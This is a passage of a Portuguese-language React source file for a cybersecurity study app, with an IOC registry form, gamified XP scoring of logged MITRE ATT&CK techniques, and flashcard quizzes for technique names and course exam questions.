            <button key={t.id} onClick={() => setFilter(t.id)} className={`text-[10px] px-2 py-1 rounded font-mono border cursor-pointer ${filter === t.id ? "bg-cyber-accent text-white border-cyber-accent" : "bg-transparent text-cyber-muted border-cyber-border"}`}>{t.icon} {typeCounts[t.id]}</button>
          ))}
        </div>
        <button onClick={() => setShowNew(true)} className={BTN}>+ NOVO IOC</button>
      </div>

      {loading && <div className="text-[11px] text-cyber-muted">Carregando...</div>}

      {filtered.map(ioc => {
        const typeInfo = IOC_TYPES.find(t => t.id === ioc.ioc_type) || IOC_TYPES[IOC_TYPES.length - 1];
        return (
          <div key={ioc.id} className={`${CARD} mb-2`}>
            <div className="flex justify-between items-start">
              <div className="flex-1 min-w-0">
                <div className="flex items-center gap-2 mb-1 flex-wrap">
                  <span className="text-[10px] px-2 py-0.5 rounded bg-[#1a1a2e] text-indigo-400 border border-indigo-400/40 font-mono">{typeInfo.icon} {typeInfo.label}</span>
                </div>
                <div className="text-[12px] text-cyber-text font-mono break-all">{ioc.value}</div>
                {ioc.description && <div className="text-[11px] text-cyber-muted mt-1">{ioc.description}</div>}
                <div className="text-[10px] text-cyber-muted mt-1">
                  {ioc.source && `Fonte: ${ioc.source} · `}{fmtDate(ioc.created_at)}
                </div>
              </div>
              <button onClick={() => remove(ioc.id)} className={`${BTN_GHOST} text-cyber-danger border-cyber-danger flex-shrink-0`}></button>
            </div>
          </div>
        );
      })}

      {!loading && filtered.length === 0 && (
        <div className={`${CARD} text-center py-8 text-cyber-muted`}>
          <div className="text-2xl mb-2"></div>
          <div className="text-xs">Nenhum IOC registrado{filter !== "all" ? " nesta categoria" : ""}</div>
        </div>
      )}

      {showNew && (
        <Modal title="NOVO IOC" onClose={() => setShowNew(false)}>
          <div className="flex flex-col gap-3">
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <div>
                <label className={LABEL}>Tipo</label>
                <select className={INPUT} value={form.ioc_type} onChange={e => setForm({ ...form, ioc_type: e.target.value })}>
                  {IOC_TYPES.map(t => <option key={t.id} value={t.id}>{t.icon} {t.label}</option>)}
                </select>
              </div>
              <div>
                <label className={LABEL}>Sessão</label>
                <select className={INPUT} value={form.session_id} onChange={e => setForm({ ...form, session_id: e.target.value })}>
                  <option value="">— Nenhuma —</option>
                  {sessions.map(s => <option key={s.id} value={s.id}>{s.title}</option>)}
                </select>
              </div>
            </div>
            <div>
              <label className={LABEL}>Valor *</label>
              <textarea className={`${INPUT} h-20 resize-none font-mono text-[11px]`} placeholder="Hash, IP, domínio, regra..." value={form.value} onChange={e => setForm({ ...form, value: e.target.value })} />
            </div>
            <div>
              <label className={LABEL}>Descrição</label>
              <input className={INPUT} placeholder="O que é este IOC" value={form.description} onChange={e => setForm({ ...form, description: e.target.value })} />
            </div>
            <div>
              <label className={LABEL}>Fonte</label>
              <input className={INPUT} placeholder="ex: CyberScan, VirusTotal, Mimikatz output" value={form.source} onChange={e => setForm({ ...form, source: e.target.value })} />
            </div>
            <div className="flex gap-2 justify-end">
              <button onClick={() => setShowNew(false)} className={BTN_GHOST}>Cancelar</button>
              <button onClick={create} className={BTN}>REGISTRAR IOC</button>
            </div>
          </div>
        </Modal>
      )}
    </div>
  );
}

// ─── Scoring / Gamificação ────────────────────────────────────────────────
const ACHIEVEMENTS = [
  { id: "first_technique", label: "Primeira Técnica", desc: "Registrou a primeira técnica", icon: "-", check: (t) => t.length >= 1 },
  { id: "first_shell", label: "Primeiro Shell", desc: "Executou um comando via Sliver", icon: "-", check: (t) => t.some(x => x.tool_used === "Sliver") },
  { id: "ten_techniques", label: "10 Técnicas", desc: "Registrou 10 técnicas", icon: "-", check: (t) => t.length >= 10 },
  { id: "twenty_five", label: "25 Técnicas", desc: "Registrou 25 técnicas", icon: "-", check: (t) => t.length >= 25 },
  { id: "fifty", label: "50 Técnicas", desc: "Registrou 50 técnicas", icon: "-", check: (t) => t.length >= 50 },
  { id: "full_discovery", label: "Discovery Master", desc: "Cobriu 100% do Discovery", icon: "-", check: (t) => t.filter(x => x.tactic === "Discovery").length >= 5 },
  { id: "full_execution", label: "Execution Master", desc: "Cobriu 100% do Execution", icon: "-", check: (t) => t.filter(x => x.tactic === "Execution").length >= 5 },
  { id: "lateral", label: "Lateral Thinker", desc: "Registrou Lateral Movement", icon: "-", check: (t) => t.some(x => x.tactic === "Lateral Movement") },
  { id: "privesc", label: "Root/Admin", desc: "Fez Privilege Escalation", icon: "-", check: (t) => t.some(x => x.tactic === "Privilege Escalation") },
  { id: "full_chain", label: "Full Kill Chain", desc: "Cobriu todas as 14 táticas", icon: "-", check: (t) => new Set(t.map(x => x.tactic)).size >= 14 },
  { id: "all_tools", label: "Arsenal Completo", desc: "Usou 5+ ferramentas diferentes", icon: "-", check: (t) => new Set(t.map(x => x.tool_used)).size >= 5 },
  { id: "multi_session", label: "Veterano", desc: "Trabalhou em 5+ sessões", icon: "-", check: (t, s) => s.length >= 5 },
];

function Scoring({ sessions, techniques }) {
  const xpPerTechnique = 50;
  const xpPerSuccess = 25;
  const xpPerTactic = 100;
  const xpPerAchievement = 200;

  const totalXp = techniques.length * xpPerTechnique
    + techniques.filter(t => t.success).length * xpPerSuccess
    + new Set(techniques.map(t => t.tactic)).size * xpPerTactic
    + ACHIEVEMENTS.filter(a => a.check(techniques, sessions)).length * xpPerAchievement;

  const level = Math.floor(totalXp / 500) + 1;
  const xpInLevel = totalXp % 500;
  const xpToNext = 500;

  const ranks = [
    { min: 1, label: "Script Kiddie", icon: "-"},
    { min: 3, label: "Pentester Jr", icon: "-"},
    { min: 5, label: "Red Teamer", icon: "-"},
    { min: 8, label: "Operator", icon: "-"},
    { min: 12, label: "APT Operator", icon: "-"},
    { min: 20, label: "Shadow Broker", icon: "-"},
  ];
  const rank = [...ranks].reverse().find(r => level >= r.min) || ranks[0];

  const tacticXp = {};
  techniques.forEach(t => { tacticXp[t.tactic] = (tacticXp[t.tactic] || 0) + xpPerTechnique + (t.success ? xpPerSuccess : 0); });
  const topTactics = Object.entries(tacticXp).sort((a, b) => b[1] - a[1]).slice(0, 5);

  return (
    <div>
      <InfoBox title={SECTION_INFO.scoring.title} icon={SECTION_INFO.scoring.icon}>{SECTION_INFO.scoring.content}</InfoBox>
      <div className={`${CARD} mb-4 text-center`}>
        <div className="text-4xl mb-2">{rank.icon}</div>
        <div className="text-lg font-extrabold text-cyber-accent">{rank.label}</div>
        <div className="text-[11px] text-cyber-muted mb-3">Level {level} · {totalXp} XP total</div>
        <div className="max-w-xs mx-auto">
          <div className="flex justify-between text-[10px] text-cyber-muted mb-1">
            <span>Level {level}</span>
            <span>{xpInLevel}/{xpToNext} XP</span>
            <span>Level {level + 1}</span>
          </div>
          <div className="h-3 bg-cyber-border rounded-full overflow-hidden">
            <div className="h-full rounded-full transition-all duration-500" style={{ width: `${(xpInLevel / xpToNext) * 100}%`, background: "linear-gradient(90deg, #DC2626, #F97316)" }} />
          </div>
        </div>
      </div>

      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mb-4">
        {[
          { label: "Total XP", val: totalXp, cls: "text-cyber-accent" },
          { label: "Técnicas", val: techniques.length, cls: "text-blue-400" },
          { label: "Taxa Sucesso", val: techniques.length ? Math.round(techniques.filter(t => t.success).length / techniques.length * 100) + "%" : "0%", cls: "text-purple-400" },
          { label: "Achievements", val: `${ACHIEVEMENTS.filter(a => a.check(techniques, sessions)).length}/${ACHIEVEMENTS.length}`, cls: "text-amber-400" },
        ].map(s => (
          <div key={s.label} className={`${CARD} text-center`}>
            <div className={`text-xl font-extrabold ${s.cls}`}>{s.val}</div>
            <div className="text-[10px] text-cyber-muted mt-1">{s.label}</div>
          </div>
        ))}
      </div>

      <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-4">
        <div className={CARD}>
          <div className="text-[10px] font-mono font-bold text-cyber-muted tracking-widest mb-3">ACHIEVEMENTS</div>
          <div className="space-y-2">
            {ACHIEVEMENTS.map(a => {
              const unlocked = a.check(techniques, sessions);
              return (
                <div key={a.id} className={`flex items-center gap-3 p-2 rounded-lg border ${unlocked ? "border-cyber-accent/30 bg-cyber-accent/5" : "border-cyber-border opacity-40"}`}>
                  <span className="text-xl">{a.icon}</span>
                  <div className="flex-1 min-w-0">
                    <div className={`text-[12px] font-bold ${unlocked ? "text-cyber-accent" : "text-cyber-muted"}`}>{a.label}</div>
                    <div className="text-[10px] text-cyber-muted">{a.desc}</div>
                  </div>
                  {unlocked && <span className="text-cyber-accent text-[10px] font-mono">+{xpPerAchievement} XP</span>}
                </div>
              );
            })}
          </div>
        </div>

        <div className={CARD}>
          <div className="text-[10px] font-mono font-bold text-cyber-muted tracking-widest mb-3">XP POR TÁTICA</div>
          {topTactics.length === 0 ? <div className="text-[11px] text-cyber-muted">Sem dados</div> : topTactics.map(([tactic, xp]) => (
            <div key={tactic} className="mb-2.5">
              <div className="flex justify-between text-[11px] mb-1">
                <span style={{ color: TACTIC_COLORS[tactic] }}>{tacticLabel(tactic)}</span>
                <span className="text-cyber-muted">{xp} XP</span>
              </div>
              <div className="h-1.5 bg-cyber-border rounded-sm">
                <div className="h-full rounded-sm" style={{ background: TACTIC_COLORS[tactic], width: `${(xp / (topTactics[0]?.[1] || 1)) * 100}%` }} />
              </div>
            </div>
          ))}

          <div className="mt-4 pt-3 border-t border-cyber-border">
            <div className="text-[10px] font-mono font-bold text-cyber-muted tracking-widest mb-2">RANKS</div>
            {ranks.map(r => (
              <div key={r.min} className={`flex items-center gap-2 py-1 ${level >= r.min ? "opacity-100" : "opacity-30"}`}>
                <span>{r.icon}</span>
                <span className="text-[11px] text-cyber-text flex-1">{r.label}</span>
                <span className="text-[10px] text-cyber-muted font-mono">Lv.{r.min}+</span>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}

// ─── Flashcards ───────────────────────────────────────────────────────────
function Flashcards({ techniques }) {
  const [deck, setDeck] = useState([]);
  const [idx, setIdx] = useState(0);
  const [selected, setSelected] = useState(null);
  const [options, setOptions] = useState([]);
  const [score, setScore] = useState({ correct: 0, wrong: 0 });
  const [mode, setMode] = useState("setup");
  const [tab, setTab] = useState("quiz");
  const [customCards, setCustomCards] = useState(() => {
    try { return JSON.parse(localStorage.getItem("cyberlab_custom_flashcards") || "[]"); } catch { return []; }
  });
  const [form, setForm] = useState({ mitre_id: "", technique_name: "", tactic: TACTICS[0], tool_used: "", notes: "", detection_notes: "" });
  const [editingIdx, setEditingIdx] = useState(null);

  useEffect(() => {
    localStorage.setItem("cyberlab_custom_flashcards", JSON.stringify(customCards));
  }, [customCards]);

  const getAllCards = () => {
    const map = {};
    techniques.forEach(t => {
      if (!t.mitre_id) return;
      const k = t.mitre_id.trim();
      if (!map[k]) map[k] = { ...t, _custom: false };
    });
    customCards.forEach(c => {
      const k = c.mitre_id.trim();
      if (!map[k]) map[k] = { ...c, _custom: true };
    });
    return Object.values(map);
  };

  const genOptions = (cards, ci) => {
    const correct = cards[ci];
    const pool = cards.filter((_, i) => i !== ci);
    const shuffled = [...pool].sort(() => Math.random() - 0.5);
    const opts = shuffled.slice(0, Math.min(3, shuffled.length)).map(c => ({ text: c.technique_name, correct: false }));
    opts.push({ text: correct.technique_name, correct: true });
    return opts.sort(() => Math.random() - 0.5);
  };

  const startQuiz = () => {
    const cards = getAllCards().sort(() => Math.random() - 0.5);
    if (cards.length < 2) return;
    setDeck(cards);
    setIdx(0);
    setSelected(null);
    setScore({ correct: 0, wrong: 0 });
    setOptions(genOptions(cards, 0));
    setMode("quiz");
  };

  const pick = (opt) => {
    if (selected !== null) return;
    setSelected(opt.text);
    setScore(s => ({ ...s, [opt.correct ? "correct" : "wrong"]: s[opt.correct ? "correct" : "wrong"] + 1 }));
  };

  const nextCard = () => {
    if (idx + 1 < deck.length) {
      const ni = idx + 1;
      setIdx(ni);
      setSelected(null);
      setOptions(genOptions(deck, ni));
    } else {
      setMode("result");
    }
  };

  const saveCard = () => {
    if (!form.mitre_id.trim() || !form.technique_name.trim()) return;
    if (editingIdx !== null) {
      setCustomCards(cc => cc.map((c, i) => i === editingIdx ? { ...form } : c));
      setEditingIdx(null);
    } else {
      setCustomCards(cc => [...cc, { ...form }]);
    }
    setForm({ mitre_id: "", technique_name: "", tactic: TACTICS[0], tool_used: "", notes: "", detection_notes: "" });
  };

  const editCard = (i) => {
    setForm({ ...customCards[i] });
    setEditingIdx(i);
  };

  const removeCard = (i) => {
    setCustomCards(cc => cc.filter((_, j) => j !== i));
    if (editingIdx === i) {
      setEditingIdx(null);
      setForm({ mitre_id: "", technique_name: "", tactic: TACTICS[0], tool_used: "", notes: "", detection_notes: "" });
    }
  };

  const card = deck[idx];
  const all = getAllCards();
  const techCount = new Set(techniques.filter(t => t.mitre_id).map(t => t.mitre_id.trim())).size;

  if (mode === "setup") {
    return (
      <div>
        <InfoBox title={SECTION_INFO.flashcards.title} icon={SECTION_INFO.flashcards.icon}>{SECTION_INFO.flashcards.content}</InfoBox>
        <div className="flex gap-1 mb-4">
          {[["quiz", "Quiz"], ["cards", "Meus Cards"]].map(([k, l]) => (
            <button key={k} onClick={() => setTab(k)} className={`px-4 py-1.5 rounded-t-md text-[11px] font-mono font-bold cursor-pointer border border-b-0 ${tab === k ? "bg-cyber-surface border-cyber-border text-cyber-accent" : "bg-transparent border-transparent text-cyber-muted hover:text-cyber-text"}`}>{l}{k === "cards" && customCards.length > 0 ? ` (${customCards.length})` : ""}</button>
          ))}
        </div>

        {tab === "quiz" && (
          <div className={`${CARD} text-center py-10`}>
            <div className="text-4xl mb-3">🃏</div>
            <div className="text-lg font-bold text-cyber-text mb-2">Flashcards MITRE ATT&CK</div>
            <div className="text-[11px] text-cyber-muted mb-1">{techCount} do Supabase + {customCards.length} customizados = {all.length} cards</div>
            <div className="text-[10px] text-cyber-muted mb-4">Modo multipla escolha — 4 opcoes por pergunta</div>
            <button onClick={startQuiz} disabled={all.length < 2} className={`${BTN} disabled:opacity-40`}>INICIAR QUIZ</button>
            {all.length < 2 && <div className="text-[11px] text-cyber-muted mt-3">Precisa de pelo menos 2 cards. Registre tecnicas ou crie cards customizados.</div>}
          </div>
        )}

        {tab === "cards" && (
          <div>
            <div className={`${CARD} mb-4`}>
              <div className="text-[10px] font-mono font-bold text-cyber-muted tracking-widest mb-3">{editingIdx !== null ? "EDITAR CARD" : "CRIAR CARD"}</div>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 mb-3">
                <div>
                  <label className={LABEL}>MITRE ID *</label>
                  <input className={INPUT} placeholder="T1059.001" value={form.mitre_id} onChange={e => setForm(f => ({ ...f, mitre_id: e.target.value }))} />
                </div>
                <div>
                  <label className={LABEL}>Nome da Tecnica *</label>
                  <input className={INPUT} placeholder="Command and Scripting Interpreter" value={form.technique_name} onChange={e => setForm(f => ({ ...f, technique_name: e.target.value }))} />
                </div>
                <div>
                  <label className={LABEL}>Tatica</label>
                  <select className={INPUT} value={form.tactic} onChange={e => setForm(f => ({ ...f, tactic: e.target.value }))}>
                    {TACTICS.map(t => <option key={t} value={t}>{tacticLabel(t)}</option>)}
                  </select>
                </div>
                <div>
                  <label className={LABEL}>Ferramenta</label>
                  <input className={INPUT} placeholder="PowerShell, Mimikatz..." value={form.tool_used} onChange={e => setForm(f => ({ ...f, tool_used: e.target.value }))} />
                </div>
              </div>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 mb-3">
                <div>
                  <label className={LABEL}>Notas</label>
                  <textarea className={`${INPUT} resize-none`} rows={2} placeholder="Como a tecnica funciona..." value={form.notes} onChange={e => setForm(f => ({ ...f, notes: e.target.value }))} />
                </div>
                <div>
                  <label className={LABEL}>Notas de Deteccao</label>
                  <textarea className={`${INPUT} resize-none`} rows={2} placeholder="Como detectar..." value={form.detection_notes} onChange={e => setForm(f => ({ ...f, detection_notes: e.target.value }))} />
                </div>
              </div>
              <div className="flex gap-2">
                <button onClick={saveCard} disabled={!form.mitre_id.trim() || !form.technique_name.trim()} className={`${BTN} disabled:opacity-40`}>{editingIdx !== null ? "SALVAR" : "ADICIONAR"}</button>
                {editingIdx !== null && <button onClick={() => { setEditingIdx(null); setForm({ mitre_id: "", technique_name: "", tactic: TACTICS[0], tool_used: "", notes: "", detection_notes: "" }); }} className={BTN_GHOST}>CANCELAR</button>}
              </div>
            </div>

            {customCards.length > 0 ? (
              <div className={CARD}>
                <div className="text-[10px] font-mono font-bold text-cyber-muted tracking-widest mb-3">CARDS CUSTOMIZADOS ({customCards.length})</div>
                <div className="space-y-2">
                  {customCards.map((c, i) => (
                    <div key={i} className="flex items-center gap-3 bg-cyber-bg rounded-md px-3 py-2 border border-cyber-border">
                      <span className="font-mono text-cyber-accent text-[12px] font-bold min-w-[90px]">{c.mitre_id}</span>
                      <span className="text-cyber-text text-[12px] flex-1 truncate">{c.technique_name}</span>
                      <span className="text-[10px] px-1.5 py-0.5 rounded hidden sm:inline" style={{ background: (TACTIC_COLORS[c.tactic] || "#888") + "22", color: TACTIC_COLORS[c.tactic] || "#888" }}>{tacticLabel(c.tactic)}</span>
                      <button onClick={() => editCard(i)} className={`${BTN_GHOST} text-[10px] px-2 py-0.5`}>Editar</button>
                      <button onClick={() => removeCard(i)} className={`${BTN_GHOST} text-[10px] px-2 py-0.5 text-red-400 border-red-400/30`}>X</button>
                    </div>
                  ))}
                </div>
              </div>
            ) : (
              <div className="text-center text-[11px] text-cyber-muted py-6">Nenhum card customizado ainda. Use o formulario acima para criar.</div>
            )}
          </div>
        )}
      </div>
    );
  }

  if (mode === "result") {
    const pct = deck.length ? Math.round(score.correct / deck.length * 100) : 0;
    return (
      <div className={`${CARD} text-center py-10`}>
        <div className="text-4xl mb-3">{pct >= 80 ? "" : pct >= 50 ? "" : ""}</div>
        <div className="text-lg font-bold text-cyber-accent mb-2">{pct}% de acerto</div>
        <div className="text-[11px] text-cyber-muted mb-4">{score.correct} corretas · {score.wrong} erradas · {deck.length} cards</div>
        <div className="flex gap-2 justify-center">
          <button onClick={startQuiz} className={BTN}>JOGAR DE NOVO</button>
          <button onClick={() => setMode("setup")} className={BTN_GHOST}>VOLTAR</button>
        </div>
      </div>
    );
  }

  const correctAnswer = card.technique_name;

  return (
    <div>
      <div className="flex justify-between items-center mb-4">
        <span className="text-[11px] text-cyber-muted">{idx + 1}/{deck.length}</span>
        <div className="flex gap-3 text-[11px]">
          <span className="text-[#22c55e]">{score.correct} corretas</span>
          <span className="text-[#ef4444]">{score.wrong} erradas</span>
        </div>
        <button onClick={() => setMode("setup")} className={`${BTN_GHOST} text-[10px]`}>Sair</button>
      </div>

      <div className="w-full h-1 bg-cyber-bg rounded-full mb-4 overflow-hidden">
        <div className="h-full bg-cyber-accent rounded-full transition-all" style={{ width: `${((idx + (selected !== null ? 1 : 0)) / deck.length) * 100}%` }} />
      </div>

      <div className={`${CARD} min-h-[140px] flex flex-col items-center justify-center text-center mb-4`}>
        <div className="text-[10px] text-cyber-muted mb-2">Qual e a tecnica?</div>
        <div className="text-2xl font-extrabold text-cyber-accent font-mono mb-2">{card.mitre_id}</div>
        <div className="text-[10px] px-2 py-0.5 rounded" style={{ background: (TACTIC_COLORS[card.tactic] || "#888") + "22", color: TACTIC_COLORS[card.tactic] || "#888" }}>{tacticLabel(card.tactic)}</div>
      </div>

      <div className="grid grid-cols-1 gap-2 mb-4">
        {options.map((opt, i) => {
          let cls = "bg-cyber-bg border border-cyber-border text-cyber-text hover:border-cyber-accent/50 cursor-pointer";
          if (selected !== null) {
            if (opt.correct) cls = "bg-[#22c55e]/10 border border-[#22c55e] text-[#22c55e]";
            else if (opt.text === selected) cls = "bg-[#ef4444]/10 border border-[#ef4444] text-[#ef4444]";
            else cls = "bg-cyber-bg border border-cyber-border text-cyber-muted opacity-50";
          }
          return (
            <button key={i} onClick={() => pick(opt)} className={`w-full text-left px-4 py-3 rounded-lg text-[13px] font-mono transition-all ${cls}`}>
              <span className="text-cyber-muted mr-2 text-[11px]">{String.fromCharCode(65 + i)}.</span>
              {opt.text}
              {selected !== null && opt.correct && <span className="float-right"></span>}
              {selected !== null && opt.text === selected && !opt.correct && <span className="float-right"></span>}
            </button>
          );
        })}
      </div>

      {selected !== null && (
        <div>
          <div className={`${CARD} mb-4`}>
            <div className="text-[11px] text-cyber-muted mb-1">Resposta correta:</div>
            <div className="text-sm font-bold text-cyber-text mb-2">{correctAnswer}</div>
            {card.tool_used && <div className="text-[11px] text-cyber-muted mb-1">Ferramenta: {card.tool_used}</div>}
            {card.notes && <div className="text-[11px] text-slate-400 mt-1 max-w-lg"> {card.notes.slice(0, 200)}</div>}
            {card.detection_notes && <div className="text-[11px] text-amber-400/80 mt-1 max-w-lg"> {card.detection_notes.slice(0, 200)}</div>}
            <MitreHintBox mitreId={card.mitre_id} />
          </div>
          <div className="flex justify-center">
            <button onClick={nextCard} className={BTN}>{idx + 1 < deck.length ? "PROXIMO" : "VER RESULTADO"}</button>
          </div>
        </div>
      )}
    </div>
  );
}

// ─── Study Cards (Provas) ─────────────────────────────────────────────────
function StudyCards() {
  const STORAGE_KEY = "cyberlab_study_progress";
  const [courseId, setCourseId] = useState(null);
  const [chapterId, setChapterId] = useState(null);
  const [mode, setMode] = useState("menu");
  const [deck, setDeck] = useState([]);
  const [idx, setIdx] = useState(0);
  const [flipped, setFlipped] = useState(false);
  const [score, setScore] = useState({ knew: 0, didnt: 0 });
  const [quizOpts, setQuizOpts] = useState([]);
  const [quizPicked, setQuizPicked] = useState(null);
  const [quizScore, setQuizScore] = useState({ correct: 0, wrong: 0 });
  const [quizWrongLog, setQuizWrongLog] = useState([]);
  const [flipWrongLog, setFlipWrongLog] = useState([]);
  const [shuffled, setShuffled] = useState(true);
  const [progress, setProgress] = useState(() => {
    try { return JSON.parse(localStorage.getItem(STORAGE_KEY) || "{}"); } catch { return {}; }
  });

  useEffect(() => {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(progress));
  }, [progress]);

  const course = STUDY_COURSES.find(c => c.id === courseId);
  const chapter = course?.chapters.find(ch => ch.id === chapterId);

  const getCards = () => {
    if (!course) return [];
    const chapters = chapterId ? [chapter] : course.chapters;
    return chapters.flatMap(ch => ch.cards.map(c => ({ ...c, chapter: ch.name, chapterId: ch.id })));
  };

  const shuffle = arr => [...arr].sort(() => Math.random() - 0.5);

  const startFlip = () => {
    const cards = getCards();
    if (cards.length === 0) return;
    setDeck(shuffled ? shuffle(cards) : cards);
    setIdx(0);
    setFlipped(false);
    setScore({ knew: 0, didnt: 0 });
    setFlipWrongLog([]);
    setMode("flip");
  };

  const startQuiz = () => {
    const cards = getCards();
    if (cards.length < 4) return;
    const d = shuffle(cards);
    setDeck(d);
    setIdx(0);
    setQuizPicked(null);
    setQuizScore({ correct: 0, wrong: 0 });
    setQuizWrongLog([]);
    setQuizOpts(genQuizOpts(d, 0));
    setMode("quiz");
  };

  const genQuizOpts = (cards, ci) => {
    const correct = cards[ci];
    const pool = cards.filter((_, i) => i !== ci);
    const wrongs = shuffle(pool).slice(0, 3).map(c => ({ text: c.a, correct: false }));
    return shuffle([...wrongs, { text: correct.a, correct: true }]);
  };

  const markCard = (knew) => {
    const card = deck[idx];
    setScore(s => ({ ...s, [knew ? "knew" : "didnt"]: s[knew ? "knew" : "didnt"] + 1 }));
    if (!knew) setFlipWrongLog(w => [...w, { chapter: card.chapter }]);
    setProgress(p => {
      const key = `${card.chapterId}::${card.q}`;
      const prev = p[key] || { seen: 0, correct: 0 };
      return { ...p, [key]: { seen: prev.seen + 1, correct: prev.correct + (knew ? 1 : 0) } };
    });
    if (idx + 1 < deck.length) {
      setIdx(idx + 1);
      setFlipped(false);
    } else {
      setMode("result");
    }
  };

  const pickQuiz = (opt) => {
    if (quizPicked !== null) return;
    setQuizPicked(opt.text);
    const card = deck[idx];
    setQuizScore(s => ({ ...s, [opt.correct ? "correct" : "wrong"]: s[opt.correct ? "correct" : "wrong"] + 1 }));
    if (!opt.correct) setQuizWrongLog(w => [...w, { chapter: card.chapter }]);
    setProgress(p => {
      const key = `${card.chapterId}::${card.q}`;
      const prev = p[key] || { seen: 0, correct: 0 };
      return { ...p, [key]: { seen: prev.seen + 1, correct: prev.correct + (opt.correct ? 1 : 0) } };
    });
  };

  const nextQuiz = () => {
    if (idx + 1 < deck.length) {
      const ni = idx + 1;
      setIdx(ni);
      setQuizPicked(null);
      setQuizOpts(genQuizOpts(deck, ni));
    } else {
      setMode("quiz-result");
    }
  };

  const chapterProgress = (ch) => {
    const total = ch.cards.length;
    let seen = 0, correct = 0;
    ch.cards.forEach(c => {
      const p = progress[`${ch.id}::${c.q}`];
      if (p) { seen++; correct += p.correct > 0 ? 1 : 0; }
    });
    return { total, seen, correct, pct: total ? Math.round((correct / total) * 100) : 0 };
  };

  const courseProgress = (c) => {
    let total = 0, correct = 0;
    c.chapters.forEach(ch => {
      const p = chapterProgress(ch);
      total += p.total;
      correct += p.correct;
    });
    return { total, correct, pct: total ? Math.round((correct / total) * 100) : 0 };
  };

  const resetProgress = () => {
    if (window.confirm("Zerar todo o progresso de estudo?")) {
      setProgress({});
    }
  };

  if (mode === "menu") {
    return (
      <div>
        <InfoBox title="Flashcards de Prova" icon="" color="#a855f7">
          <p>Flashcards extraídos dos PDFs das disciplinas. Dois modos de estudo:</p>
          <p><b>Flip Cards</b> — leia a pergunta, pense na resposta, vire o card e marque se sabia ou não.</p>
          <p><b>Quiz</b> — multipla escolha com 4 opções. Mínimo 4 cards por seleção.</p>
          <p>Seu progresso é salvo localmente e mostrado por capítulo.</p>
        </InfoBox>

        <div className="flex justify-between items-center mb-4">
          <div className="text-[10px] font-mono text-cyber-muted tracking-widest">SELECIONE UMA DISCIPLINA</div>
          <button onClick={resetProgress} className={`${BTN_GHOST} text-[10px] text-red-400 border-red-400/30`}>Zerar progresso</button>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6">
          {STUDY_COURSES.map(c => {
            const cp = courseProgress(c);
            return (
              <button key={c.id} onClick={() => setCourseId(c.id)}
                className={`${CARD} text-left cursor-pointer transition-all hover:border-cyber-accent/50 ${courseId === c.id ? "border-cyber-accent bg-cyber-accent/5" : ""}`}>
                <div className="flex items-center gap-2 mb-2">
                  <span className="text-2xl">{c.icon}</span>
                  <div>
                    <div className="text-sm font-bold text-cyber-text">{c.name}</div>
                    <div className="text-[10px] text-cyber-muted">{c.chapters.length} capítulos · {c.chapters.reduce((s, ch) => s + ch.cards.length, 0)} cards</div>
                  </div>
                </div>
                <div className="w-full h-1.5 bg-cyber-bg rounded-full overflow-hidden mt-2">
                  <div className="h-full rounded-full transition-all" style={{ width: `${cp.pct}%`, background: cp.pct >= 80 ? "#22c55e" : cp.pct >= 40 ? "#f59e0b" : "#3b82f6" }} />
                </div>
                <div className="text-[10px] text-cyber-muted mt-1">{cp.correct}/{cp.total} dominados ({cp.pct}%)</div>
              </button>
            );
          })}
        </div>

        {course && (
          <>
            <div className="text-[10px] font-mono text-cyber-muted tracking-widest mb-3">CAPÍTULOS — {course.name}</div>

            <div className="mb-3 flex items-center gap-3">
              <button onClick={() => setChapterId(null)}
                className={`text-[11px] font-mono px-3 py-1 rounded-md cursor-pointer border ${!chapterId ? "bg-cyber-accent/10 border-cyber-accent text-cyber-accent" : "bg-transparent border-cyber-border text-cyber-muted hover:text-cyber-text"}`}>
                Todos ({course.chapters.reduce((s, ch) => s + ch.cards.length, 0)})
              </button>
            </div>

            <div className="space-y-2 mb-5">
              {course.chapters.map(ch => {
                const cp = chapterProgress(ch);
                const active = chapterId === ch.id;
                return (
                  <button key={ch.id} onClick={() => setChapterId(active ? null : ch.id)}
                    className={`w-full text-left ${CARD} cursor-pointer transition-all hover:border-cyber-accent/30 ${active ? "border-cyber-accent bg-cyber-accent/5" : ""}`}>
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2 flex-1 min-w-0">
                        <span className="text-[11px] font-mono text-cyber-accent font-bold whitespace-nowrap">{ch.cards.length}</span>
                        <span className="text-[12px] text-cyber-text truncate">{ch.name}</span>
                      </div>
                      <div className="flex items-center gap-2 shrink-0">
                        <div className="w-16 h-1.5 bg-cyber-bg rounded-full overflow-hidden">
                          <div className="h-full rounded-full transition-all" style={{ width: `${cp.pct}%`, background: cp.pct >= 80 ? "#22c55e" : cp.pct >= 40 ? "#f59e0b" : "#3b82f6" }} />
                        </div>
                        <span className="text-[10px] text-cyber-muted w-8 text-right">{cp.pct}%</span>
                      </div>
                    </div>
                  </button>
                );
              })}
            </div>

            <div className="flex gap-2 items-center flex-wrap">
              <label className="flex items-center gap-1.5 text-[11px] text-cyber-muted cursor-pointer select-none">
                <input type="checkbox" checked={shuffled} onChange={e => setShuffled(e.target.checked)} className="accent-cyber-accent" />
                Embaralhar
              </label>
              <div className="flex-1" />
              <button onClick={startFlip} className={BTN}>FLIP CARDS</button>
              <button onClick={startQuiz} disabled={getCards().length < 4} className={`${BTN} disabled:opacity-40`} title={getCards().length < 4 ? "Precisa de pelo menos 4 cards" : ""}>QUIZ</button>
            </div>
          </>
        )}
      </div>
    );
  }

  if (mode === "flip") {
    const card = deck[idx];
    return (
      <div>
        <div className="flex justify-between items-center mb-3">
          <span className="text-[11px] text-cyber-muted font-mono">{idx + 1}/{deck.length}</span>
          <div className="flex gap-3 text-[11px] font-mono">
            <span className="text-[#22c55e]">{score.knew} sabia</span>
            <span className="text-[#ef4444]">{score.didnt} não sabia</span>
          </div>
          <button onClick={() => setMode("menu")} className={`${BTN_GHOST} text-[10px]`}>Sair</button>
        </div>

        <div className="w-full h-1 bg-cyber-bg rounded-full mb-4 overflow-hidden">
          <div className="h-full bg-cyber-accent rounded-full transition-all" style={{ width: `${((idx + (flipped ? 0.5 : 0)) / deck.length) * 100}%` }} />
